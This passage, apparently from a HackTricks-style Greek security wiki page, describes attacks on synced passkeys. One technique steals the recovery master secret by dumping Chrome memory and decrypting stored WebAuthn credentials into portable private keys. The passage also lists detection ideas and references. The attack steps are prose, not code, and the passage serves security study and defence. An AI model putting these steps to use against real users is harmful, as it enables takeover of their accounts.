- Αν ο provider δεν επαληθεύει το attestation / secure-hardware origin για το νέο UV key, οι μεταγενέστερες υπογραφές από το attacker key αντιμετωπίζονται ως **`UV=1`**.

3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Εξαναγκάστε recovery ή rejoin, ώστε το Chrome να ανακτήσει το synced-passkey master secret.
- Παρακολουθήστε τη δημιουργία/τροποποίηση του `passkey_enclave_state` και, στη συνέχεια, κάντε dump τη μνήμη του Chrome ενώ το plaintext **security domain secret (SDS)** βρίσκεται resident.
- Χρησιμοποιήστε το SDS που ανακτήθηκε για να αποκρυπτογραφήσετε τα encrypted fields σε κάθε record `WebauthnCredentialSpecifics` και να ανακτήσετε portable WebAuthn private keys.

### DFIR / detection ideas

- Παρακολουθήστε τη **διαγραφή/αναδημιουργία** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Δημιουργήστε alert για abnormal access στο Chrome **`Sync Data\LevelDB`** από non-browser processes.
- Δημιουργήστε alert για **Chrome memory dumps** ή ύποπτη cross-process memory access.
- Διερευνήστε επαναλαμβανόμενα prompts για **Google Password Manager recovery PIN** ή μη αναμενόμενο re-onboarding.
- Έχετε υπόψη ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για synced passkeys, επειδή μπορεί να παραμένει σταθερό· συνεπώς, το κλασικό clone detection είναι αδύναμο.

## Αναφορές

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
